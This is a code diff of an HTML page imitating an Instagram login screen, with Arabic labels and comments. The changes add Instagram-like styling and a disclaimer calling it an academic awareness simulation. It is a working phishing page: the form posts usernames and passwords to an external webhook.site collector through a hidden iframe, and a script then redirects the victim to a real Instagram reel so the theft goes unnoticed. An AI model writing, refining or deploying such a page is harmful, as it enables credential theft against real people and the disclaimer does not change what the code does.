@@ -5,18 +5,80 @@
     <meta charset="UTF-8">
     <title>Instagram Login</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; }
-        form { border: 1px solid #ccc; padding: 20px; border-radius: 5px; }
-        input { display: block; margin-bottom: 10px; padding: 10px; width: 200px; }
-        button { width: 100%; padding: 10px; background-color: #3897f0; color: white; border: none; cursor: pointer; }
+        body { 
+            font-family: sans-serif; 
+            display: flex; 
+            flex-direction: column; /* لترتيب التحذير فوق المربع */
+            align-items: center; 
+            padding-top: 50px; 
+            background-color: #fafafa; /* لون خلفية مريح للعين يشبه إنستغرام */
+        }
+        form { 
+            background-color: white;
+            border: 1px solid #dbdbdb; 
+            padding: 20px 40px; 
+            border-radius: 5px; 
+            text-align: center;
+        }
+        input { 
+            display: block; 
+            margin-bottom: 10px; 
+            padding: 10px; 
+            width: 250px; 
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+        }
+        button { 
+            width: 100%; 
+            padding: 10px; 
+            background-color: #0095f6; 
+            color: white; 
+            border: none; 
+            cursor: pointer; 
+            border-radius: 5px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .warning {
+            color: red; 
+            font-weight: bold;
+            text-align: center;
+            max-width: 300px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
-    <form action="https://webhook.site/843b446b-e431-43ed-b986-8264a7b39b1e" method="POST">
+
+    <p class="warning">
+        This is a cybersecurity awareness simulation for academic purposes only.
+        Do NOT enter real credentials.
+    </p>
+
+    <form action="https://webhook.site/843b446b-e431-43ed-b986-8264a7b39b1e" 
+          method="POST" 
+          target="hiddenFrame" 
+          onsubmit="redirectUser()">
+        
         <h3>تسجيل الدخول</h3>
         <input type="text" name="username" placeholder="اسم المستخدم" required>
         <input type="password" name="password" placeholder="كلمة المرور" required>
         <button type="submit">Log In</button>
+        
     </form>
+
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+    <script>
+    function redirectUser() {
+        // ننتظر 800 جزء من الثانية لضمان وصول الطلب إلى Webhook قبل التوجيه
+        setTimeout(function() {
+            window.location.href = "https://www.instagram.com/reel/DVG7MzbCAPK/?igsh=MWp6eXRwbTN5b3Ntdg==";
+        }, 800);
+    }
+    </script>
+
 </body>
 </html>
